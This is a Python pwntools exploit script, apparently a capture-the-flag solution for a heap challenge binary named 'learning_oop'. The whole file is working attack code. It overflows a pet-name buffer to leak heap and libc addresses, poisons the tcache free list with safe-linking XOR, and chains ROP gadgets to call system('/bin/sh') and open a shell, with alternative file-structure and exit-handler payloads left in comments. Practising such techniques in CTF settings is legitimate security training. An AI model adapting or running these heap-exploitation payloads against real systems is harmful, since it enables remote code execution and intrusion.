from pwn import *
from subprocess import check_output
import sys
import os

_path = "./learning_oop"
context.binary = exe = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
addr = 'localhost'
port = 1337
cmd = f'''
    set max-visualize-chunk-size 0x500
    set solib-search-path {os.getcwd()}
    decompiler connect ida --host localhost --port 3662
    continue
    # brva 0x141F
    # brva 0x1C63
    # brva 0x1470
    # brva 0x143E
    brva 0x19C3
    brva 0x16CD
'''

context.terminal = ['wt.exe', 'wsl', '-e', 'sudo', 'bash', '-c']

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))
def conn():
    if args.LOCAL:
        if args.GDB:
            p = gdb.debug(_path, cmd)
        else:
            p = exe.process()
    
    if args.DOCKER:
        p = remote(addr, port)
        sleep(2)
        if args.GDB:
            pid = get_pid("/app/learning_oop")
            gdb.attach(pid, exe=exe.path,
                    gdbscript=cmd+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe")
            pause()

    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]), ssl=True)
    return p

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)
'''
_op_file = FileStructure()
_op_file.unknown2 = p(0)*2 + p(libc.sym["system"]) + p(0)*3 + p(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p(libc.sym["_IO_2_1_stdout_"] +0x50)
_op_file._wide_data = libc.sym["_IO_2_1_stdout_"]
_op_file.flags = 0xfbad20b1 + (int.from_bytes(b';sh;', 'little') << 32)
_op_file._lock = libc.address + 0x21a200
_tmp_file = bytes(_op_file)
'''

def p(_data, _arch = 64, endian = 'little'):
    switcher = {
        64: p64(_data & 0xffffffffffffffff, endian),
        32: p32(_data & 0xffffffff, endian),
        16: p16(_data & 0xffff, endian),
        8:  p8(_data & 0xff, endian)
    }
    return switcher[_arch]

chall = conn()

def sl(_data):
    chall.sendline(_data)

def sla(rgx, _data):
    chall.sendlineafter(rgx, _data)

def se(_data):
    chall.send(_data)

def sa(rgx, _data):
    chall.sendafter(rgx, _data)

def check():
    chall.interactive()
    exit()

def create(pet, name):
    sla(b">", b"1")
    sla(b": ", str(pet))
    sla(b"name: \n", name)

def move():
    sla(b">", b"6")

def main():
    context.log_level = 'debug'
    create(1, b"A"*256 + p32(0x1) + p32(0x6))
    chall.recvuntil(b"pet: ")
    leak = int(chall.recvline(), 16)
    heap = leak - 0x136d0 - 0xc00
    xor = leak >> 12
    log.info(f"heap: {hex(heap)}")
    create(1, b"B"*256)
    create(1, b"C"*256 + p32(0x1) + p64(0xe))
    create(1, b"D"*256 + p32(0x1) + p64(0x7))
    create(1, b"E"*256 + p32(0x1) + p64(0x5))
    create(1, b"F"*256 + p32(0x1) + p64(0x3))
    create(1, b"G"*256 + p32(0x1) + p32(0x10) + p64(0) + p64(0x481))
    create(1, b"a"*256 + p32(0x1) + p32(0x50))
    for _ in range(9):
        move()
    create(1, b"D"*256 + p32(0x1) + p32(0xe) + p64(0) + p64(0x121) + p64((heap + 0xf0) ^ xor))
    create(1, b"dummy")
    create(4, b"E"*24 + p64(heap+0x137f0+0xc00) + b"\00"*224 + p32(1) + p32(0x100))   
    create(4, b"I"*256 + p32(1) + p32(0x100))
    sla(b"> ", b"2")
    chall.recvuntil(b"3. " + b"E"*24)
    leak = u64(chall.recvline()[:-1].ljust(8, b"\00")) 
    libc.address = (leak ^ ((heap + 0x14000) >> 12)) - (libc.sym.main_arena + 96)
    log.info(f"leak libc: {hex(leak)}")
    sl(b"10")   
    for _ in range(9):
        move()
    create(1, b"b"*256 + p32(0x1) + p32(0x50))
    create(1, p64(0) + p64(next(libc.search(b"/bin/sh"))) + b"c"*240 +
           p32(0x1) + p32(0x50) + p64(0) + p64(0x000000000000c561)
           + b"\00"*0x260 + p64(libc.sym.system + 27))
    gadget = libc.address + 0x00000000000984df
    ret = libc.address + 0x000000000002882f
    # 0x00000000000984df : mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x380]
    # 0x000000000002882f : ret
    create(1, p64(0)*3 + p64(gadget) + p64(ret) + b"d"*216 +
           p32(0x1) + p32(0x50) + b"A"*0x240 + p64(0) + p64(0x121) + p64(heap+0x14640))
    sla(b">", b"2")
    # sla(b"pet?\n", b"1")
    
    check()

if __name__ == "__main__":
    main()
